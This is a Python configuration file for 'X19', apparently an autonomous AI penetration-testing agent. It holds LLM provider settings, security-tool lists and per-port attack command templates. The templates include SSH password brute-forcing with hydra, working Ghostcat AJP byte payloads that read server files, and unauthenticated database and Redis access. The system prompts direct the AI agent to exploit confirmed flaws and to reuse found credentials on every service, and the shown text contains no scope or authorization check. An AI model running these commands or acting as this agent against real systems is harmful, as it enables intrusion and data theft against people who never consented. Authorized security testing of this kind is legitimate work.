import os
from config import CONFIG, load_config

# ===================== PROVIDER REGISTRY =====================

PROVIDERS = {
    "openrouter": {
        "name": "OpenRouter",
        "desc": "Gateway to 200+ models (free & paid)",
        "base_url": "https://openrouter.ai/api/v1",
        "default_model": "deepseek/deepseek-chat:free",
        "api_key_env": "OPENROUTER_API_KEY",
        "api_key_config": "OPENROUTER_API_KEY",
        "needs_key": True,
        "format": "openai",
    },
    "openai": {
        "name": "OpenAI",
        "desc": "GPT-4o, GPT-4, GPT-3.5-turbo",
        "base_url": "https://api.openai.com/v1",
        "default_model": "gpt-4o",
        "api_key_env": "OPENAI_API_KEY",
        "api_key_config": "OPENAI_API_KEY",
        "needs_key": True,
        "format": "openai",
    },
    "anthropic": {
        "name": "Anthropic",
        "desc": "Claude 3 Opus, Sonnet, Haiku",
        "base_url": "https://api.anthropic.com/v1",
        "default_model": "claude-3-sonnet-20240229",
        "api_key_env": "ANTHROPIC_API_KEY",
        "api_key_config": "ANTHROPIC_API_KEY",
        "needs_key": True,
        "format": "anthropic",
    },
    "google": {
        "name": "Google Gemini",
        "desc": "Gemini 1.5 Pro, Gemini 1.5 Flash",
        "base_url": "https://generativelanguage.googleapis.com/v1beta",
        "default_model": "gemini-1.5-flash",
        "api_key_env": "GOOGLE_API_KEY",
        "api_key_config": "GOOGLE_API_KEY",
        "needs_key": True,
        "format": "google",
    },
    "groq": {
        "name": "Groq",
        "desc": "Fast inference, free Llama 3.3 70B (no credit card). Set GROQ_API_KEY env or run `x19 --setup-groq <KEY>`.",
        "base_url": "https://api.groq.com/openai/v1",
        "default_model": "llama-3.3-70b-versatile",
        "api_key_env": "GROQ_API_KEY",
        "api_key_config": "GROQ_API_KEY",
        "needs_key": True,
        "format": "openai",
    },
    "deepseek": {
        "name": "DeepSeek",
        "desc": "Cheap & capable, DeepSeek-V3",
        "base_url": "https://api.deepseek.com/v1",
        "default_model": "deepseek-chat",
        "api_key_env": "DEEPSEEK_API_KEY",
        "api_key_config": "DEEPSEEK_API_KEY",
        "needs_key": True,
        "format": "openai",
    },
    "together": {
        "name": "Together AI",
        "desc": "Many open-source models, cheap",
        "base_url": "https://api.together.xyz/v1",
        "default_model": "mistralai/Mixtral-8x22B-Instruct-v0.1",
        "api_key_env": "TOGETHER_API_KEY",
        "api_key_config": "TOGETHER_API_KEY",
        "needs_key": True,
        "format": "openai",
    },
    "agentrouter": {
        "name": "AgentRouter",
        "desc": "AI model router/gateway",
        "base_url": "https://agentrouter.org/v1",
        "default_model": "gpt-4o",
        "api_key_env": "AGENTROUTER_API_KEY",
        "api_key_config": "AGENTROUTER_API_KEY",
        "needs_key": True,
        "format": "openai",
    },
    "cerebras": {
        "name": "Cerebras",
        "desc": "Cerebras inference (free Llama 3.3 70B / Qwen 2.5, very fast). Get key at https://cloud.cerebras.ai/",
        "base_url": "https://api.cerebras.ai/v1",
        "default_model": "llama-3.3-70b",
        "api_key_env": "CEREBRAS_API_KEY",
        "api_key_config": "CEREBRAS_API_KEY",
        "needs_key": True,
        "format": "openai",
    },
    "nvidia": {
        "name": "NVIDIA API",
        "desc": "NVIDIA AI Foundation Models",
        "base_url": "https://integrate.api.nvidia.com/v1",
        "default_model": "qwen/qwen3-coder-480b-a35b-instruct",
        "api_key_env": "NVIDIA_API_KEY",
        "api_key_config": "NVIDIA_API_KEY",
        "needs_key": True,
        "format": "openai",
    },
    "dashscope": {
        "name": "Alibaba DashScope (Qwen)",
        "desc": "Qwen3-Coder via Model Studio. Set DASHSCOPE_BASE_URL for a workspace endpoint.",
        "base_url": os.getenv("DASHSCOPE_BASE_URL", "https://dashscope-intl.aliyuncs.com/compatible-mode/v1"),
        "default_model": "qwen3-coder-next",
        "api_key_env": "DASHSCOPE_API_KEY",
        "api_key_config": "DASHSCOPE_API_KEY",
        "needs_key": True,
        "format": "openai",
    },
    "ollama": {
        "name": "Ollama (Local)",
        "desc": "Run models locally on your own machine",
        "base_url": os.getenv("X19_OLLAMA_URL", "http://localhost:11434"),
        "default_model": os.getenv("X19_OLLAMA_MODEL", "llama3"),
        "api_key_env": "",
        "api_key_config": "",
        "needs_key": False,
        "format": "ollama",
    },
    "huggingface": {
        "name": "Hugging Face Inference API",
        "desc": "HF Inference API (OpenAI-compatible). Set HF_TOKEN env. Free tier has rate limits.",
        "base_url": "https://api-inference.huggingface.co/v1",
        "default_model": "meta-llama/Llama-3.1-8B-Instruct",
        "api_key_env": "HF_TOKEN",
        "api_key_config": "HF_TOKEN",
        "needs_key": True,
        "format": "openai",
    },
}

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
    B = '\033[94m'; M = '\033[95m'; C = '\033[96m'
    W = '\033[97m'; N = '\033[0m'; BOLD = '\033[1m'; D = '\033[90m'

# Clean status indicators
ICO = type('ICO', (), {
    "OK":   f"{C.G}[+]{C.N}",
    "FAIL": f"{C.R}[-]{C.N}",
    "WARN": f"{C.Y}[!]{C.N}",
    "INFO": f"{C.B}[*]{C.N}",
    "MORE": f"{C.D}[>]{C.N}",
    "FIRE": f"{C.R}[FIRE]{C.N}",
    "FLAG": f"{C.G}[FLAG]{C.N}",
    "BOLT": f"{C.Y}[!]{C.N}",
    "GEAR": f"{C.B}[/]{C.N}",
    "LOCK": f"{C.R}[LOCK]{C.N}",
    "KEY":  f"{C.Y}[KEY]{C.N}",
    "NODE": f"{C.M}[*]{C.N}",
    "SUB":  f"{C.D}|{C.N}",
    "LINE": f"{C.D}|{C.N}",
    "END":  f"{C.D}\\{C.N}",
})()

# Tool family classification — maps command bases to their family for diversity enforcement
TOOL_FAMILIES = {
    "dns": {"dig", "nslookup", "dnsx", "dnsrecon", "subfinder", "amass", "shuffledns", "massdns", "dnsvalidator", "gotator", "sublist3r", "findomain", "assetfinder", "crt"},
    "port_scan": {"nmap", "masscan", "rustscan", "unicornscan", "zenmap"},
    "web_req": {"curl", "wget", "httpie", "httpx", "fetch"},
    "web_scanner": {"nuclei", "whatweb", "wappalyzer", "wpscan", "joomscan", "droopescan", "jaeles"},
    "dirbust": {"ffuf", "gobuster", "dirsearch", "dirb", "wfuzz", "kiterunner"},
    "web_fuzz": {"ffuf", "wfuzz", "arjun", "paramspider", "gospider", "katana"},
    "web_exploit": {"sqlmap", "commix", "xsstrike", "dalfox", "xsser", "crlfuzz"},
    "exploit_framework": {"metasploit", "msfconsole", "beef", "searchsploit"},
    "smb": {"smbclient", "smbmap", "crackmapexec", "smbget"},
    "ldap": {"ldapsearch", "ldapwhoami"},
    "ad": {"bloodhound", "impacket", "kerbrute", "certipy", "netexec", "nxc", "responder"},
    "cloud": {"awscli", "azcli", "gcloud", "prowler", "scoutsuite", "s3scanner"},
    "network": {"ping", "traceroute", "fping", "hping", "tcpdump", "tshark", "mtr"},
    "crypto": {"testssl", "sslscan", "sslyze", "openssl"},
    "auth": {"hydra", "john", "hashcat", "medusa", "crowbar", "cewl"},
    "git": {"git-dumper", "trufflehog", "gitleaks", "git"},
    "js": {"linkfinder", "subjs", "jstools", "js-beautify"},
    "mobile": {"apktool", "jadx", "apkleaks", "frida", "objection", "mobsf"},
    "container": {"trivy", "kube-hunter", "kubeaudit", "kubectl", "docker"},
    "analysis": {"grep", "awk", "sed", "jq", "sort", "uniq", "head", "tail", "wc"},
    "shell": {"echo", "cat", "ls", "find", "xargs"},
    "db": {"sqlmap", "mysql", "psql", "mongo", "redis-cli"},
    "snmp": {"snmpwalk", "snmpcheck", "snmpenum"},
    "wireless": {"aircrack-ng", "reaver", "bully", "wash", "airodump-ng"},
    "forensic": {"volatility", "binwalk", "exiftool", "strings", "yara", "foremost"},
    "stealth": {"steghide", "zsteg", "stegsolve"},
    "api": {"curl", "graphql", "httpie", "postman"},
    "exploit": {"python3", "python", "nc", "ncat", "socat", "perl", "ruby", "php", "powershell", "ps1"},
    "report": {"dr-header", "whatportis"},
}

# Inverse: tool -> family for fast lookup
_TOOL_TO_FAMILY = {}
for fam, tools in TOOL_FAMILIES.items():
    for t in tools:
        _TOOL_TO_FAMILY.setdefault(t, fam)

# Scope-specific tool recommendations: target_type -> list of (technique_name, [tool,...], reason)
SCOPE_TOOL_SUGGESTIONS = {
    "web": [
        ("tech_detect", ["whatweb", "wappalyzer", "httpx"], "identify stack before attacking"),
        ("dir_enum", ["ffuf", "gobuster", "dirsearch", "kiterunner"], "find hidden endpoints, use common wordlists from ~/.x19/data/wordlists/"),
        ("js_scan", ["linkfinder", "subjs", "jstools"], "extract API endpoints and secrets from JS"),
        ("crawl", ["katana", "gospider", "gau"], "discover all routes and parameters"),
        ("fuzz", ["ffuf", "wfuzz", "arjun"], "parameter fuzzing, try common params"),
        ("scanner", ["nuclei", "whatweb"], "known CVE and misconfiguration checks"),
        ("exploit", ["sqlmap", "xsstrike", "dalfox", "commix"], "automated exploitation"),
    ],
    "api": [
        ("schema_discovery", ["curl", "httpie", "graphql"], "probe /graphql?introspection, /openapi.json, /swagger.json"),
        ("endpoint_fuzz", ["ffuf", "kiterunner"], "API route fuzzing with API-specific wordlists"),
        ("auth_test", ["curl", "httpie", "jwt_tool"], "test auth bypass, JWT weaknesses, rate limits"),
        ("idor", ["curl", "ffuf"], "sequential ID enumeration for IDOR/BOLA"),
    ],
    "network": [
        ("port_scan", ["nmap", "masscan", "rustscan"], "fast port discovery"),
        ("service_enum", ["nmap", "smbclient", "snmpwalk", "ldapsearch"], "service-specific enumeration"),
        ("vuln_scan", ["nuclei", "whatweb", "searchsploit"], "version-based CVE lookup"),
    ],
    "cloud": [
        ("bucket_enum", ["s3scanner", "awscli", "azcli", "gcloud"], "find open storage buckets"),
        ("config_audit", ["prowler", "scoutsuite", "trivy"], "cloud security posture assessment"),
    ],
    "mobile": [
        ("decompile", ["apktool", "jadx"], "decompile and analyze app code"),
        ("secrets", ["apkleaks", "mobsf"], "extract hardcoded secrets, API keys"),
        ("runtime", ["frida", "objection"], "runtime manipulation and SSL pinning bypass"),
    ],
}

# Service-specific attack templates: port -> (technique, command, expected, interpretation, priority)
SERVICE_ATTACKS = {
    21: [
        ("anonymous_ftp", "curl -s --user anonymous:anonymous ftp://{host}/", "directory listing or welcome msg", "If directory listing works, check for writable dirs + .bash_profile upload", 0.7),
        ("ftp_nmap_script", "nmap -sV --script ftp-anon,ftp-bounce,ftp-vsftpd-backdoor -p 21 {host}", "nmap vuln/anon scripts output", "Check for anonymous login, bounce, known backdoors", 0.6),
    ],
    22: [
        ("ssh_weak_ciphers", "nmap -sV --script ssh2-enum-algos -p 22 {host}", "list of algorithms", "Weak ciphers (arcfour, cbc) allow decryption", 0.4),
        ("ssh_audit", "ssh-audit {host} 2>/dev/null || echo 'not installed'", "client/server algorithm list", "Check for weak host keys, deprecated algorithms", 0.5),
        ("ssh_default_creds", f"hydra -l root -P {CONFIG.WORDLIST_DIR}/rockyou.txt -t 4 ssh://{{host}} 2>/dev/null | head -20", "login attempts", "Try common root passwords", 0.3),
    ],
    25: [
        ("smtp_open_relay", "nmap -sV --script smtp-open-relay -p 25 {host}", "open relay detection", "If open relay, spam/phishing possible", 0.7),
        ("smtp_vrfy", "nmap -sV --script smtp-enum-users -p 25 {host}", "enumerated users", "VRFY/EXPN user enumeration", 0.6),
        ("smtp_commands", "curl -s telnet://{host}:25 --max-time 5 -X 'HELO test' 2>/dev/null || echo 'telnet not available'", "SMTP banner + commands", "Check STARTTLS, auth mechanisms", 0.3),
    ],
    53: [
        ("dns_version", "dig +short version.bind chaos txt @{host} 2>/dev/null || nslookup -q=txt -class=chaos version.bind {host} 2>/dev/null", "BIND version", "Old BIND versions have known RCEs", 0.5),
        ("dns_zone_transfer", "dig axfr @{host} {domain} 2>/dev/null || host -l {domain} {host} 2>/dev/null", "zone data", "Zone transfer leaks all DNS records", 0.8),
        ("dns_recursion", "nmap -sU -p 53 --script dns-recursion {host}", "recursion enabled/disabled", "Open resolver → amplification DDoS", 0.5),
    ],
    80: [
        ("web_root", "curl -sik 'http://{host}/' --max-time 10", "HTTP response + headers", "Check server header, tech stack hints in response", 0.5),
        ("web_robots", "curl -sik 'http://{host}/robots.txt' --max-time 10", "disallowed paths", "Hidden endpoints in Disallow", 0.6),
        ("web_common_paths", "for p in /.git/HEAD /admin /backup /wp-admin /manager/html /console; do curl -sik 'http://{host}$p' -o /dev/null -w '%{{http_code}} $p\\n' --max-time 5; done", "HTTP codes for common paths", "200/301/403 on sensitive paths = actionable", 0.7),
    ],
    443: [
        ("web_root_https", "curl -sik 'https://{host}/' --max-time 10", "HTTPS response + headers", "Check server, SSL cert info, HSTS", 0.5),
        ("ssl_scan", "testssl --quiet --fast {host} 2>/dev/null || sslscan {host} 2>/dev/null || nmap -sV --script ssl-enum-ciphers -p 443 {host}", "SSL/TLS vulnerabilities", "Heartbleed, Poodle, Sweet32, ROBOT", 0.7),
    ],
    389: [
        ("ldap_anonymous", "ldapsearch -x -h {host} -b '' -s base 2>/dev/null | head -30", "LDAP base DN + naming contexts", "Anonymous bind gives directory structure", 0.8),
        ("ldap_dump", "ldapsearch -x -h {host} -b 'DC=domain,DC=com' 2>/dev/null | head -50", "LDAP entries", "Dump all directory entries", 0.7),
    ],
    445: [
        ("smb_null_session", "smbclient -N -L //{host}/ 2>/dev/null || smbmap -H {host} 2>/dev/null", "share listing", "Null session = full share access", 0.8),
        ("smb_ms17010", "nmap -p 445 --script smb-vuln-ms17-010 {host}", "MS17-010 detection", "EternalBlue → full RCE", 0.9),
        ("smb_signing", "nmap -p 445 --script smb2-security-mode {host}", "SMB signing status", "No signing = relay attack possible", 0.5),
    ],
    8009: [
        ("ajp_ghostcat", "python3 -c \"import socket;s=socket.socket();s.connect(('{host}',8009));s.send(b'\\x00\\x0b\\x00\\x01\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00');print(s.recv(1024)[:200]);s.close()\"", "AJP response bytes", "Non-empty response = Ghostcat vulnerable (CVE-2020-1938)", 0.9),
        ("ajp_file_read", "python3 -c \"import socket;s=socket.socket();s.connect(('{host}',8009));s.send(b'\\x00\\x0b\\x00\\x01\\x00\\x18\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x0b\\x00\\x00\\x00\\x0d\\x00\\x0c/WEB-INF/web.xml');print(s.recv(4096)[:500]);s.close()\"", "WEB-INF/web.xml contents", "File read via AJP = arbitrary file read (CVE-2020-1938)", 0.9),
     ],
    8080: [
        ("tomcat_manager", "curl -sik 'http://{host}:8080/manager/html' --max-time 10", "HTTP code + body", "403 = exists but auth; 200 = accessible", 0.8),
        ("tomcat_examples", "curl -sik 'http://{host}:8080/examples/' --max-time 10", "HTTP code + body", "Default examples often have vulns", 0.5),
        ("ajp_ghostcat", "python3 -c \"import socket;s=socket.socket();s.connect(('{host}',8009));s.send(b'\\x00\\x0b\\x00\\x01\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00');print(s.recv(1024)[:200]);s.close()\"", "AJP response bytes", "Non-empty response = Ghostcat vulnerable (CVE-2020-1938)", 0.9),
    ],
    8081: [
        ("web_root_alt", "curl -sik 'http://{host}:8081/' --max-time 10", "HTTP response", "Alternate web port, often proxies or APIs", 0.5),
    ],
    8443: [
        ("web_root_alt_https", "curl -sik 'https://{host}:8443/' --max-time 10", "HTTPS response", "Alternate HTTPS, often admin panels", 0.6),
        ("ssl_scan_alt", "testssl --quiet --fast {host}:8443 2>/dev/null || nmap -sV --script ssl-enum-ciphers -p 8443 {host}", "SSL/TLS vulnerabilities", "Heartbleed, Poodle, etc. on alt port", 0.6),
    ],
    1433: [
        ("mssql_scan", "nmap -p 1433 --script ms-sql-info,ms-sql-empty-password {host}", "MSSQL version + null sa check", "Empty sa password = full DB access", 0.7),
    ],
    3306: [
        ("mysql_unauth", "mysql -h {host} -u root --password='' -e 'SELECT version();' 2>/dev/null || echo 'no mysql client or auth required'", "MySQL version or access denied", "Empty root password = full DB access", 0.8),
        ("mysql_nmap", "nmap -p 3306 --script mysql-empty-password,mysql-users,mysql-audit {host}", "MySQL vuln scripts", "Check for empty root, user enum, weak auth", 0.7),
    ],
    5432: [
        ("pgsql_unauth", "psql -h {host} -U postgres -c 'SELECT version();' 2>/dev/null || echo 'no psql client or auth required'", "PostgreSQL version or error", "Unauthenticated access → full DB", 0.8),
    ],
    6379: [
        ("redis_unauth", "echo 'INFO' | timeout 5 nc {host} 6379 2>/dev/null || redis-cli -h {host} INFO 2>/dev/null | head -20", "Redis INFO output", "No auth = full Redis access → RCE via cron", 0.9),
    ],
    27017: [
        ("mongo_unauth", "echo 'db.version()' | timeout 5 mongosh {host}:27017 --quiet 2>/dev/null || echo 'no mongosh or auth'", "MongoDB version", "No auth = full DB access", 0.8),
    ],
    9200: [
        ("elastic_unauth", "curl -s 'http://{host}:9200/' --max-time 5", "cluster info", "No auth = full ES access → data leak", 0.8),
    ],
}

SYSTEM_PROMPT = """You are X19, an autonomous penetration testing agent.
Analyze the context and return ONE JSON object:
{
  "thinking": "chain-of-thought: analyse target state, what you know, what's missing, then decide the next action",
  "next_command": "single shell command to execute or empty string",
  "reasoning": "tool:<name> | why: <this check> | evidence: <expected output>",
  "finding": null or {"title": "...", "severity": "critical/high/medium/low/info", "detail": "...", "evidence": "..."},
  "completed": false
}

THINKING STRUCTURE (include in "thinking"):
1. CURRENT STATE: what ports/services/findings do I have?
2. GAPS: what haven't I checked yet per service?
3. NEXT STEP: the highest-value check right now
4. EXPECTED EVIDENCE: what output confirms or denies the hypothesis

METHODOLOGY (phase-ordered):
1. RECON: nmap -sV -sC → whatweb → subdomain enum → service fingerprint
2. WEB ENUM: dir bust → sensitive files → crawl → param discovery
3. VULN SCAN: nuclei → targeted tests (JWT, GraphQL, SSRF, SQLi, XSS)
4. EXPLOIT: confirmed vuln → matching exploit → verify output → record PoC

EVIDENCE RULES:
- A finding WITHOUT concrete command output is a HALLUCINATION. Report only findings backed by real stdout.
- "evidence" MUST contain a real snippet from command output (error codes, response bodies, version strings).
- Severity: critical=RCE/unauth-admin, high=SQLi/file-read, medium=XSS/InfoLeak, low=version-info
- After 3 failed attempts on the same service, pivot — don't keep retrying.

TOOL RULES:
- NEVER repeat an identical command that produced no new info.
- NEVER run nmap if we already have port scan results.
- If a tool times out or returns empty, switch technique.
- After finding a credential, try it on all discovered services immediately.
- CRITICAL: ONLY use tools listed as AVAILABLE. If TOOL AVAILABILITY says NOT AVAILABLE, do NOT suggest it.
- PHASE STATE shows current phase and tool-usage counts. Max 2 uses per tool per phase.

ATTACK CLASSES (check what's relevant to discovered tech):
  Web: SQLi → XSS → SSRF/OOB → LFI/RFI → RCE → IDOR → SSTI → PP → XXE → CSRF
  API: JWT → GraphQL → Rate-limit → Parameter pollution
  Cloud: Metadata → Buckets → IAM
  AD: AS-REP → Kerberoast → SMB → LDAP → BloodHound
- When you find an SSRF or blind vuln, interactsh OOB canary is already enabled for nuclei/sqlmap."""

FAST_DECISION_PROMPT = """You are X19, an autonomous pentester (fast mode).
Return ONE JSON:
{
  "thinking": "state → gap → action",
  "next_command": "single shell command or ''",
  "reasoning": "tool:<name>, evidence:<expected output>",
  "finding": null or a finding object,
  "completed": false
}
Phase order: RECON → ENUM → VULN → EXPLOIT.
Evidence: findings need real output, not guesses.
Keep commands minimal. Do NOT repeat identical commands.
- CRITICAL: ONLY use tools listed as AVAILABLE. Ignore unavailable tools.
- PHASE STATE shows your current phase. Max 2 uses per tool per phase. Advance phases by gathering needed intel."""

LEAN_SYSTEM_PROMPT = """You are X19, an autonomous security assessment agent.
Respond with exactly one JSON object:
{
  "thinking": "chain-of-thought: analyse target state, what you know, what's missing, then decide the next action",
  "next_command": "one shell command or empty",
  "reasoning": "tool:<name> | why: <why this check> | evidence: <exact expected output>",
  "finding": null or {"title": "...", "severity": "critical/high/medium/low/info", "detail": "...", "evidence": "..."},
  "completed": false
}

THINKING STRUCTURE (include in your "thinking" field):
1. CURRENT STATE: what ports/services/findings do I have?
2. GAPS: what haven't I checked yet for each discovered service?
3. NEXT LOGICAL STEP: the highest-ROI check right now
4. EXPECTED EVIDENCE: what specific output would confirm or deny the hypothesis

METHODOLOGY (phase-ordered, do NOT skip phases):
1. RECON: nmap -sV -sC --top-ports → whatweb/waf_detect → subdomain enum (if domain)
2. WEB ENUM: gobuster/ffuf dirs → curl /.env,/robots.txt,/admin → gospider/katana crawl
3. VULN SCAN: nuclei → JWT/GraphQL/SSRF specific tests → searchsploit for service versions
4. EXPLOIT: For each confirmed vuln, run matching exploit → verify evidence → record PoC

EVIDENCE RULES:
- A finding WITHOUT concrete command output = HALLUCINATION. Only report findings backed by real stdout.
- "evidence" field MUST contain a real snippet from command output (error codes, response bodies, version strings).
- Severity guide: critical=RCE/unauth-admin, high=SQLi/file-read, medium=XSS/InfoLeak, low=version-disclosure
- After 3 failed attempts on the same service, move on — don't keep banging.
- completed=true only when ALL open ports/services have been investigated and no leads remain.

TOOL RULES:
- NEVER repeat the same command verbatim. If it gave you nothing, try a different angle.
- NEVER run nmap if TARGET MODEL already shows open ports.
- If a tool times out or returns empty, switch to a different approach — don't retry the same thing.
- Move deeper: after finding a service (SSH, HTTP, SMB, etc.), probe it with service-specific tools.
- After finding a credential, immediately try it on all found services.
- CRITICAL: ONLY use tools listed as AVAILABLE. If TOOL AVAILABILITY says NOT AVAILABLE, ignore it.
- PHASE STATE shows current phase and tool-usage counts. Max 2 uses per tool per phase. Follow phase order.

ATTACK CLASSES (check each relevant to discovered tech):
  Web: SQLi → XSS → SSRF/OOB → LFI/RFI → RCE/CMD-Injection → IDOR/BOLA → SSTI → Prototype Pollution → XXE → CSRF → Race Condition → Open Redirect → Host Header Injection
  API: JWT weaknesses → GraphQL introspection → Rate-limit abuse → Parameter pollution
  Cloud: AWS/GCP/Azure metadata → Bucket enumeration → IAM enum
  AD: AS-REP roasting → Kerberoasting → SMB enum → LDAP enum → BloodHound collector"""

LEAN_FAST_PROMPT = """You are X19, autonomous pentester (fast mode).
Return ONE JSON:
{
  "thinking": "current state → gap → next action",
  "next_command": "shell command or ''",
  "reasoning": "tool:<name>, why:<reason>",
  "finding": null or finding object,
  "completed": false
}
Phase order: RECON → ENUM → VULN → EXPLOIT. Move through phases — don't stay stuck.
Evidence rule: findings need real command output, not guesses.
Short commands. No verbatim repeats.
CRITICAL: ONLY use AVAILABLE tools. Skip NOT AVAILABLE.
PHASE STATE shows your phase. Max 2 uses per tool per phase."""

BANNER = f"""
{C.BOLD}{C.B}  X19  autonomous security assessment agent  v3.0{C.N}
{C.D}  adaptive AI-driven testing — phase-enforced{C.N}
"""

PROVIDER_PRIORITY = [
    "huggingface",
    "cerebras",
    "groq",
    "openrouter",
    "google",
    "nvidia",
    "deepseek",
    "together",
    "dashscope",
    "agentrouter",
    "openai",
    "anthropic",
]


def _failover_disabled() -> bool:
    return os.getenv("X19_DISABLE_FAILOVER", "").strip().lower() in ("1", "true", "yes")


def _provider_has_key(provider_id: str) -> bool:
    info = PROVIDERS[provider_id]
    if not info.get("needs_key"):
        return True
    env = info.get("api_key_env", "")
    if env and os.getenv(env):
        return True
    cfg = info.get("api_key_config", "")
    if cfg and load_config().get(cfg):
        return True
    return False
